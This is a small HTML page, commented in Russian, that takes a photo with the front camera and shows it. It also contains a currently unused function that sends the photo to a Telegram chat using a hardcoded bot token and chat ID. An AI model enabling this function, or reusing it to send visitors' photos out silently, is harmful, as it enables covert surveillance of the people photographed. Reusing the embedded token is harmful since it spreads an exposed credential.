<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Съемка с фронтальной камеры</title>
</head>
<body>
    <h1>Съемка с фронтальной камеры</h1>
    <button onclick="capturePhoto()">Сделать фото</button>
    <div id="photoContainer">
        <!-- Фото будет выведено здесь -->
    </div>

    <script>
        async function capturePhoto() {
            try {
                // Запрашиваем доступ к фронтальной камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement("video");
                video.srcObject = stream;
                await video.play();

                // Ожидание для запуска видео и корректного захвата кадра
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Настройка canvas для захвата изображения с видео
                const canvas = document.createElement("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext("2d");
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Останавливаем стрим и освобождаем ресурсы камеры
                stream.getTracks().forEach(track => track.stop());

                // Преобразование изображения в формат Base64
                const photoDataURL = canvas.toDataURL("image/png");

                // Отображаем фото на странице
                const img = document.createElement("img");
                img.src = photoDataURL;
                img.alt = "Захваченное фото";
                document.getElementById("photoContainer").innerHTML = "";
                document.getElementById("photoContainer").appendChild(img);

                console.log("Фотография захвачена:", photoDataURL);

                // Пример отправки в Telegram (замените 'YOUR_TELEGRAM_BOT_TOKEN' и 'CHAT_ID' на нужные значения)
                // await sendPhotoToTelegram(photoDataURL);

            } catch (error) {
                console.error("Ошибка доступа к камере:", error);
            }
        }

        // Функция отправки фотографии в Telegram (опционально)
        async function sendPhotoToTelegram(photoDataURL) {
            const token = "6765756823:AAEaZgZa7u7zj7D2Io1FD0J4CEdACLzSDZo";
            const chat_id = -1002328129351;

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: "POST",
                    body: JSON.stringify({
                        chat_id: chat_id,
                        photo: photoDataURL
                    }),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });

                if (response.ok) {
                    console.log("Фото успешно отправлено в Telegram.");
                } else {
                    console.error("Ошибка при отправке фото в Telegram:", response.statusText);
                }
            } catch (error) {
                console.error("Ошибка при отправке фото в Telegram:", error);
            }
        }
    </script>
</body>
</html>
